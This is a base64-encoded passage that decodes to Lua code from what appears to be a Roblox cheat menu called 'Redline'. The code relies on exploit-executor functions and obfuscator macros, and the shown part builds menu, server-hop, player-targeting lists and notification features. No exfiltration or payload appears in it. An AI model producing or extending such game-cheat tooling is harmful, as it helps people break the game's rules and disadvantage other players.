gICAgICAgICAgICAgICAgICAgICBsb2NhbCBjb25maWdfbmFtZSA9IGZsYWdzWyJjb25maWdfbmFtZV9saXN0Il0KICAgICAgICAgICAgICAgICAgICAgICAgZGVsZmlsZShsaWJyYXJ5LmRpcmVjdG9yeSAuLiAiL2NvbmZpZ3MvIiAuLiBjb25maWdfbmFtZSAuLiAiLmNmZyIpCiAgICAgICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6dXBkYXRlX2NvbmZpZ19saXN0KCkKICAgICAgICAgICAgICAgICAgICAgICAgbm90aWZpY2F0aW9uczpjcmVhdGVfbm90aWZpY2F0aW9uKHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5hbWUgPSAiQ29uZmlncyIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbmZvID0gIkRlbGV0ZWQgY29uZmlnOlxuIiAuLiBjb25maWdfbmFtZQogICAgICAgICAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICB9KQoKICAgICAgICAgICAgc2VjdGlvbjpjb2xvcnBpY2tlcih7bmFtZSA9ICJNZW51IEFjY2VudCIsIGNhbGxiYWNrID0gZnVuY3Rpb24oY29sb3IsIGFscGhhKSBsaWJyYXJ5OnVwZGF0ZV90aGVtZSgiYWNjZW50IiwgY29sb3IpIGVuZCwgY29sb3IgPSB0aGVtZXMucHJlc2V0LmFjY2VudH0pCiAgICAgICAgICAgIHNlY3Rpb246a2V5YmluZCh7bmFtZSA9ICJNZW51IEJpbmQiLCBrZXkgPSBFbnVtLktleUNvZGUuSW5zZXJ0LCBjYWxsYmFjayA9IGZ1bmN0aW9uKGJvb2wpIHdpbmRvdy50b2dnbGVfbWVudShib29sKSBlbmQsIHNlcGVyYXRvciA9IHRydWUsIGRlZmF1bHQgPSB0cnVlfSkKCiAgICAgICAgICAgIGxvY2FsIF9yZXF1ZXN0ID0gKGh0dHBfcmVxdWVzdCBhbmQgaHR0cF9yZXF1ZXN0KSBvciAocmVxdWVzdCBhbmQgcmVxdWVzdCkgb3IgKGh0dHAgYW5kIGh0dHAucmVxdWVzdCkKCiAgICAgICAgICAgIHNlY3Rpb246YnV0dG9uKHtuYW1lID0gIkpvaW4gTG93ZXN0IFNlcnZlciIsIGNhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgbG9jYWwgU2VydmVycyA9IHN0cmluZy5mb3JtYXQoImh0dHBzOi8vZ2FtZXMucm9ibG94LmNvbS92MS9nYW1lcy8lcy9zZXJ2ZXJzL1B1YmxpYz9zb3J0T3JkZXI9QXNjJmxpbWl0PTEwMCIsIHRvc3RyaW5nKGdhbWUuUGxhY2VJZCkpCiAgICAgICAgCiAgICAgICAgICAgICAgICBsb2NhbCBMaXN0U2VydmVycyA9IGZ1bmN0aW9uKGN1cnNvcikKICAgICAgICAgICAgICAgICAgICBsb2NhbCBSYXcgPSBnYW1lOkh0dHBHZXQoU2VydmVycyAuLiAoKGN1cnNvciBhbmQgIiZjdXJzb3I9Ii4uY3Vyc29yKSBvciAiIikpCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFNlcnZpY2VzLkh0dHBTZXJ2aWNlOkpTT05EZWNvZGUoUmF3KQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgICAgICAgICBsb2NhbCBTZXJ2ZXIsIE5leHQ7IHJlcGVhdAogICAgICAgICAgICAgICAgICAgIGxvY2FsIFNlcnZlcnMgPSBMaXN0U2VydmVycyhOZXh0KQogICAgICAgICAgICAgICAgICAgIFNlcnZlciA9IFNlcnZlcnMuZGF0YVsxXQogICAgICAgICAgICAgICAgICAgIE5leHQgPSBTZXJ2ZXJzLm5leHRQYWdlQ3Vyc29yCiAgICAgICAgICAgICAgICB1bnRpbCBTZXJ2ZXIKICAgICAgICAKICAgICAgICAgICAgICAgIGlmIFNlcnZlci5pZCA9PSBnYW1lLkpvYklkIHRoZW4KICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5Lm5vdGlmaWNhdGlvbnM6Y3JlYXRlX25vdGlmaWNhdGlvbih7CiAgICAgICAgICAgICAgICAgICAgICAgIG5hbWUgPSAiUmVkbGluZSIsCiAgICAgICAgICAgICAgICAgICAgICAgIGluZm8gPSBgWW91IGFyZSBjdXJyZW50bHkgaW4gdGhlIHNtYWxsZXN0IHNlcnZlciFgLAogICAgICAgICAgICAgICAgICAgICAgICBsaWZldGltZSA9IDEwCiAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgICAgICByZXR1cm4gIAogICAgICAgICAgICAgICAgZW5kIAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBTZXJ2aWNlcy5UZWxlcG9ydFNlcnZpY2U6VGVsZXBvcnRUb1BsYWNlSW5zdGFuY2UoZ2FtZS5QbGFjZUlkLCBTZXJ2ZXIuaWQpCiAgICAgICAgICAgIGVuZH0pCgogICAgICAgICAgICBzZWN0aW9uOmJ1dHRvbih7bmFtZSA9ICJTZXJ2ZXIgSG9wIiwgY2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBsb2NhbCBTZXJ2ZXJzID0ge30KICAgICAgICAgICAgICAgIGxvY2FsIFJlcXVlc3QgPSBfcmVxdWVzdCh7VXJsID0gc3RyaW5nLmZvcm1hdCgiaHR0cHM6Ly9nYW1lcy5yb2Jsb3guY29tL3YxL2dhbWVzLyVkL3NlcnZlcnMvUHVibGljP3NvcnRPcmRlcj1EZXNjJmxpbWl0PTEwMCZleGNsdWRlRnVsbEdhbWVzPXRydWUiLCB0b3N0cmluZyhnYW1lLlBsYWNlSWQpKX0pCiAgICAgICAgICAgICAgICBsb2NhbCBCb2R5ID0gU2VydmljZXMuSHR0cFNlcnZpY2U6SlNPTkRlY29kZShSZXF1ZXN0LkJvZHkpCiAgICAgICAgCiAgICAgICAgICAgICAgICBpZiBCb2R5IGFuZCBCb2R5LmRhdGEgdGhlbgogICAgICAgICAgICAgICAgICAgIGZvciBfLCBWYWx1ZSBpbiBuZXh0LCBCb2R5LmRhdGEgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgdHlwZShWYWx1ZSkgPT0gInRhYmxlIiBhbmQgdG9udW1iZXIoVmFsdWUucGxheWluZykgYW5kIHRvbnVtYmVyKFZhbHVlLm1heFBsYXllcnMpIGFuZCBWYWx1ZS5wbGF5aW5nIDwgVmFsdWUubWF4UGxheWVycyBhbmQgVmFsdWUuaWQgfj0gZ2FtZS5Kb2JJZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YWJsZS5pbnNlcnQoU2VydmVycywgMSwgVmFsdWUuaWQpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgICAgICAgICBTZXJ2aWNlcy5UZWxlcG9ydFNlcnZpY2U6VGVsZXBvcnRUb1BsYWNlSW5zdGFuY2UoZ2FtZS5QbGFjZUlkLCBTZXJ2ZXJzW21hdGgucmFuZG9tKDEsICNTZXJ2ZXJzKV0pCiAgICAgICAgICAgIGVuZH0pCgogICAgICAgICAgICBzZWN0aW9uOmJ1dHRvbih7bmFtZSA9ICJSZWpvaW4iLCBjYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIFNlcnZpY2VzLlRlbGVwb3J0U2VydmljZTpUZWxlcG9ydFRvUGxhY2VJbnN0YW5jZShnYW1lLlBsYWNlSWQsIGdhbWUuSm9iSWQpCiAgICAgICAgICAgIGVuZH0pCiAgICAgICAgICAgIAogICAgICAgICAgICBsb2NhbCBfY29sdW1uID0gcGxheWVybGlzdDpjb2x1bW4oe30pCiAgICAgICAgICAgIGxvY2FsIF9zZWN0aW9uID0gX2NvbHVtbjpzZWN0aW9uKHtuYW1lID0gIlBsYXllcnMiLCBzaXplID0gMSwgZGVmYXVsdCA9IGZhbHNlfSkKCiAgICAgICAgICAgIGxvY2FsIHBscl9saXN0ID0gX3NlY3Rpb246bGlzdCh7b3B0aW9ucyA9IHt9LCBmbGFnID0gInBsYXllcl9saXN0In0pOwoKICAgICAgICAgICAgX2NvbHVtbiA9IHBsYXllcmxpc3Q6Y29sdW1uKHt9KQoKICAgICAgICAgICAgX3NlY3Rpb24gPSBfY29sdW1uOnNlY3Rpb24oe25hbWUgPSAiUGxheWVyIE9wdGlvbnMiLCBzaXplID0gMSwgZGVmYXVsdCA9IGZhbHNlLCBzaWRlID0gJ3JpZ2h0J30pCgogICAgICAgICAgICBsb2NhbCBfcGxheWVybGFiZWwgPSBfc2VjdGlvbjpsYWJlbCh7bmFtZSA9ICJTZWxlY3RlZCBQbGF5ZXIgOiBOb25lIn0pCgogICAgICAgICAgICB0YXNrLnNwYXduKExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIHdoaWxlIHRhc2sud2FpdCgwLjAxKSBkbwogICAgICAgICAgICAgICAgICAgIF9wbGF5ZXJsYWJlbC5zZXQoc3RyaW5nLmZvcm1hdCgiU2VsZWN0ZWQgUGxheWVyIDogJXMiLCBsaWJyYXJ5LmZsYWdzWyJwbGF5ZXJfbGlzdCJdIG9yICJOb25lIikpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKSkKCiAgICAgICAgICAgIGxvY2FsIF9zdGF0dXNsYWJlbCA9IF9zZWN0aW9uOmxhYmVsKHtuYW1lID0gIlN0YXR1cyA6IE5vbmUifSkKCiAgICAgICAgICAgIHRhc2suc3Bhd24oTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgd2hpbGUgdGFzay53YWl0KDAuMDEpIGRvCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgcGxheWVydmFsdWUgPSBsaWJyYXJ5LmZsYWdzWyJwbGF5ZXJfbGlzdCJdCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgc3RhdHVzCgogICAgICAgICAgICAgICAgICAgIGlmIHBsYXllcnZhbHVlIH49IG5pbCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRhYmxlLmZpbmQobGlicmFyeS5wcmlvcml0eSwgcGxheWVydmFsdWUpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0YXR1cyA9ICI8Zm9udCBjb2xvcj0ncmdiKDI1NSwwLDApJz5Qcmlvcml0eTwvZm9udD4iCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2VpZiB0YWJsZS5maW5kKGxpYnJhcnkud2hpdGVsaXN0LCBwbGF5ZXJ2YWx1ZSkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhdHVzID0gIjxmb250IGNvbG9yPSdyZ2IoMCwyNTUsMCknPldoaXRlbGlzdGVkPC9mb250PiIKICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhdHVzID0gIk5vbmUiCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgc3RhdHVzID0gIk5vbmUiCiAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgIF9zdGF0dXNsYWJlbC5zZXQoc3RyaW5nLmZvcm1hdCgiU3RhdHVzIDogJXMiLCBzdGF0dXMpKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkpCgogICAgICAgICAgICBfc2VjdGlvbjpidXR0b24oe25hbWUgPSAiUHJpb3JpdGlzZSIsIGNhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgaWYgbm90IGxpYnJhcnkuZmxhZ3NbInBsYXllcl9saXN0Il0gdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgICAgICBpZiB0YWJsZS5maW5kKGxpYnJhcnkud2hpdGVsaXN0LCBsaWJyYXJ5LmZsYWdzWyJwbGF5ZXJfbGlzdCJdKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgdGFibGUucmVtb3ZlKGxpYnJhcnkud2hpdGVsaXN0LCB0YWJsZS5maW5kKGxpYnJhcnkud2hpdGVsaXN0LCBsaWJyYXJ5LmZsYWdzWyJwbGF5ZXJfbGlzdCJdKSkKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGlmIHRhYmxlLmZpbmQobGlicmFyeS5wcmlvcml0eSwgbGlicmFyeS5mbGFnc1sicGxheWVyX2xpc3QiXSkgdGhlbgogICAgICAgICAgICAgICAgICAgIHRhYmxlLnJlbW92ZShsaWJyYXJ5LnByaW9yaXR5LCB0YWJsZS5maW5kKGxpYnJhcnkucHJpb3JpdHksIGxpYnJhcnkuZmxhZ3NbInBsYXllcl9saXN0Il0pKQoKICAgICAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGlmIG5vdCB0YWJsZS5maW5kKGxpYnJhcnkucHJpb3JpdHksIGxpYnJhcnkuZmxhZ3NbInBsYXllcl9saXN0Il0pIHRoZW4KICAgICAgICAgICAgICAgICAgICB0YWJsZS5pbnNlcnQobGlicmFyeS5wcmlvcml0eSwgbGlicmFyeS5mbGFnc1sicGxheWVyX2xpc3QiXSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmR9KQoKICAgICAgICAgICAgX3NlY3Rpb246YnV0dG9uKHtuYW1lID0gIldoaXRlbGlzdCIsIGNhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgaWYgbm90IGxpYnJhcnkuZmxhZ3NbInBsYXllcl9saXN0Il0gdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgICAgICBpZiB0YWJsZS5maW5kKGxpYnJhcnkucHJpb3JpdHksIGxpYnJhcnkuZmxhZ3NbInBsYXllcl9saXN0Il0pIHRoZW4KICAgICAgICAgICAgICAgICAgICB0YWJsZS5yZW1vdmUobGlicmFyeS5wcmlvcml0eSwgdGFibGUuZmluZChsaWJyYXJ5LnByaW9yaXR5LCBsaWJyYXJ5LmZsYWdzWyJwbGF5ZXJfbGlzdCJdKSkKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGlmIHRhYmxlLmZpbmQobGlicmFyeS53aGl0ZWxpc3QsIGxpYnJhcnkuZmxhZ3NbInBsYXllcl9saXN0Il0pIHRoZW4KICAgICAgICAgICAgICAgICAgICB0YWJsZS5yZW1vdmUobGlicmFyeS53aGl0ZWxpc3QsIHRhYmxlLmZpbmQobGlicmFyeS53aGl0ZWxpc3QsIGxpYnJhcnkuZmxhZ3NbInBsYXllcl9saXN0Il0pKQoKICAgICAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGlmIG5vdCB0YWJsZS5maW5kKGxpYnJhcnkud2hpdGVsaXN0LCBsaWJyYXJ5LmZsYWdzWyJwbGF5ZXJfbGlzdCJdKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgdGFibGUuaW5zZXJ0KGxpYnJhcnkud2hpdGVsaXN0LCBsaWJyYXJ5LmZsYWdzWyJwbGF5ZXJfbGlzdCJdKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZH0pCgogICAgICAgICAgICBsb2NhbCByZWZyZXNocGxycyA9IExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGxvY2FsIGNhY2hlID0ge30KCiAgICAgICAgICAgICAgICBmb3IgaSx2IGluIHBsYXllcnM6R2V0UGxheWVycygpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgdj09bHAgdGhlbiBjb250aW51ZSBlbmQKCiAgICAgICAgICAgICAgICAgICAgdGFibGUuaW5zZXJ0KGNhY2hlLCB2Lk5hbWUpCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICB0YWJsZS5zb3J0KGNhY2hlKQoKICAgICAgICAgICAgICAgIHBscl9saXN0LnJlZnJlc2hfb3B0aW9ucyhjYWNoZSkKICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgdGFzay5zcGF3bihyZWZyZXNocGxycykKCiAgICAgICAgICAgIHBsYXllcnMuUGxheWVyQWRkZWQ6Q29ubmVjdChyZWZyZXNocGxycykKCiAgICAgICAgICAgIHBsYXllcnMuUGxheWVyUmVtb3Zpbmc6Q29ubmVjdChyZWZyZXNocGxycykKICAgICAgICBlbmQKICAgIC0tCgogICAgLS0gTm90aWZpY2F0aW9uIExpYnJhcnkKICAgICAgICBmdW5jdGlvbiBub3RpZmljYXRpb25zOnJlZnJlc2hfbm90aWZzKCkgCiAgICAgICAgICAgIGxvY2FsIG9mZnNldCA9IDUwCgogICAgICAgICAgICBmb3IgaSwgdiBpbiBub3RpZmljYXRpb25zLm5vdGlmcyBkbwogICAgICAgICAgICAgICAgbG9jYWwgUG9zaXRpb24gPSB2ZWMyKDIwLCBvZmZzZXQpCiAgICAgICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKHYsIHtQb3NpdGlvbiA9IGRpbV9vZmZzZXQoUG9zaXRpb24uWCwgUG9zaXRpb24uWSl9LCBFbnVtLkVhc2luZ1N0eWxlLlF1YWQsIDAuNCkKICAgICAgICAgICAgICAgIG9mZnNldCArPSAodi5BYnNvbHV0ZVNpemUuWSArIDEwKQogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIHJldHVybiBvZmZzZXQKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICBmdW5jdGlvbiBub3RpZmljYXRpb25zOmZhZGUocGF0aCwgaXNfZmFkaW5nKQogICAgICAgICAgICBsb2NhbCBmYWRpbmcgPSBpc19mYWRpbmcgYW5kIDEgb3IgMCAKICAgICAgICAgICAgCiAgICAgICAgICAgIGxpYnJhcnk6dHdlZW4ocGF0aCwge0JhY2tncm91bmRUcmFuc3BhcmVuY3kgPSBmYWRpbmd9LCBFbnVtLkVhc2luZ1N0eWxlLlF1YWQsIDEpCgogICAgICAgICAgICBmb3IgXywgaW5zdGFuY2UgaW4gcGF0aDpHZXREZXNjZW5kYW50cygpIGRvIAogICAgICAgICAgICAgICAgaWYgbm90IGluc3RhbmNlOklzQSgiR3VpT2JqZWN0IikgdGhlbiAKICAgICAgICAgICAgICAgICAgICBpZiBpbnN0YW5jZTpJc0EoIlVJU3Ryb2tlIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKGluc3RhbmNlLCB7VHJhbnNwYXJlbmN5ID0gZmFkaW5nfSwgRW51bS5FYXNpbmdTdHlsZS5RdWFkLCAxKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgIAogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICBlbmQgCiAgICAgICAgCiAgICAgICAgICAgICAgICBpZiBpbnN0YW5jZTpJc0EoIlRleHRMYWJlbCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKGluc3RhbmNlLCB7VGV4dFRyYW5zcGFyZW5jeSA9IGZhZGluZ30pCiAgICAgICAgICAgICAgICBlbHNlaWYgaW5zdGFuY2U6SXNBKCJGcmFtZSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKGluc3RhbmNlLCB7QmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IGluc3RhbmNlLlRyYW5zcGFyZW5jeSBhbmQgMC42IGFuZCBpc19mYWRpbmcgYW5kIDEgb3IgMC42fSwgRW51bS5FYXNpbmdTdHlsZS5RdWFkLCAxKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCAKICAgICAgICAKICAgICAgICBmdW5jdGlvbiBub3RpZmljYXRpb25zOmNyZWF0ZV9ub3RpZmljYXRpb24ob3B0aW9ucykKICAgICAgICAgICAgbG9jYWwgY2ZnID0gewogICAgICAgICAgICAgICAgbmFtZSA9IG9wdGlvbnMubmFtZSBvciAiVGhpcyBpcyBhIHRpdGxlISI7CiAgICAgICAgICAgICAgICBpbmZvID0gb3B0aW9ucy5pbmZvIG9yICJUaGlzIGlzIGV4dHJhIGluZm8hIjsKICAgICAgICAgICAgICAgIGxpZmV0aW1lID0gb3B0aW9ucy5saWZldGltZSBvciAzOwogICAgICAgICAgICAgICAgaXRlbXMgPSB7fTsKICAgICAgICAgICAgICAgIG91dGxpbmU7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGxvY2FsIGl0ZW1zID0gY2ZnLml0ZW1zOyBkbyAKICAgICAgICAgICAgICAgIGl0ZW1zWyAibm90aWZpY2F0aW9uIiBdID0gbGlicmFyeTpjcmVhdGUoICJGcmFtZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gbGlicmFyeVsgIml0ZW1zIiBdOwogICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDAsIDIxMCwgMCwgNTMpOwogICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgIEFuY2hvclBvaW50ID0gdmVjMigxLCAwKTsKICAgICAgICAgICAgICAgICAgICBBdXRvbWF0aWNTaXplID0gRW51bS5BdXRvbWF0aWNTaXplLlk7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigxNCwgMTQsIDE2KQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlTdHJva2UiICwgewogICAgICAgICAgICAgICAgICAgIENvbG9yID0gcmdiKDIzLCAyMywgMjkpOwogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAibm90aWZpY2F0aW9uIiBdOwogICAgICAgICAgICAgICAgICAgIFRyYW5zcGFyZW5jeSA9IDE7CiAgICAgICAgICAgICAgICAgICAgQXBwbHlTdHJva2VNb2RlID0gRW51bS5BcHBseVN0cm9rZU1vZGUuQm9yZGVyCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaXRlbXNbICJ0aXRsZSIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiVGV4dExhYmVsIiAsIHsKICAgICAgICAgICAgICAgICAgICBGb250RmFjZSA9IGZvbnRzLmZvbnQ7CiAgICAgICAgICAgICAgICAgICAgVGV4dENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgVGV4dCA9IGNmZy5uYW1lOwogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAibm90aWZpY2F0aW9uIiBdOwogICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigwLCA3LCAwLCA2KTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEF1dG9tYXRpY1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWFk7CiAgICAgICAgICAgICAgICAgICAgVGV4dFNpemUgPSAxNDsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUNvcm5lciIgLCB7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJub3RpZmljYXRpb24iIF07CiAgICAgICAgICAgICAgICAgICAgQ29ybmVyUmFkaXVzID0gZGltKDAsIDMpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaXRlbXNbICJpbmZvIiBdID0gbGlicmFyeTpjcmVhdGUoICJUZXh0TGFiZWwiICwgewogICAgICAgICAgICAgICAgICAgIEZvbnRGYWNlID0gZm9udHMuZm9udDsKICAgICAgICAgICAgICAgICAgICBUZXh0Q29sb3IzID0gcmdiKDE0NSwgMTQ1LCAxNDUpOwogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBUZXh0ID0gY2ZnLmluZm87CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJub3RpZmljYXRpb24iIF07CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAsIDksIDAsIDIyKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgIFRleHRYQWxpZ25tZW50ID0gRW51bS5UZXh0WEFsaWdubWVudC5MZWZ0OwogICAgICAgICAgICAgICAgICAgIFRleHRXcmFwcGVkID0gdHJ1ZTsKICAgICAgICAgICAgICAgICAgICBBdXRvbWF0aWNTaXplID0gRW51bS5BdXRvbWF0aWNTaXplLlhZOwogICAgICAgICAgICAgICAgICAgIFRleHRTaXplID0gMTQ7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlQYWRkaW5nIiAsIHsKICAgICAgICAgICAgICAgICAgICBQYWRkaW5nQm90dG9tID0gZGltKDAsIDE3KTsKICAgICAgICAgICAgICAgICAgICBQYWRkaW5nUmlnaHQgPSBkaW0oMCwgOCk7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJpbmZvIiBdCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaXRlbXNbICJiYXIiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIkZyYW1lIiAsIHsKICAgICAgICAgICAgICAgICAgICBBbmNob3JQb2ludCA9IHZlYzIoMCwgMSk7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJub3RpZmljYXRpb24iIF07CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAsIDgsIDEsIC02KTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMCwgMCwgMCwgNSk7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDE7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gdGhlbWVzLnByZXNldC5hY2NlbnQKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJQ29ybmVyIiAsIHsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImJhciIgXTsKICAgICAgICAgICAgICAgICAgICBDb3JuZXJSYWRpdXMgPSBkaW0oMCwgOTk5KQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlQYWRkaW5nIiAsIHsKICAgICAgICAgICAgICAgICAgICBQYWRkaW5nUmlnaHQgPSBkaW0oMCwgOCk7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJub3RpZmljYXRpb24iIF0KICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIGluZGV4ID0gI25vdGlmaWNhdGlvbnMubm90aWZzICsgMQogICAgICAgICAgICBub3RpZmljYXRpb25zLm5vdGlmc1tpbmRleF0gPSBpdGVtc1sgIm5vdGlmaWNhdGlvbiIgXQoKICAgICAgICAgICAgbm90aWZpY2F0aW9uczpmYWRlKGl0ZW1zWyAibm90aWZpY2F0aW9uIiBdLCBmYWxzZSkKICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIG9mZnNldCA9IG5vdGlmaWNhdGlvbnM6cmVmcmVzaF9ub3RpZnMoKQoKICAgICAgICAgICAgaXRlbXNbICJub3RpZmljYXRpb24iIF0uUG9zaXRpb24gPSBkaW1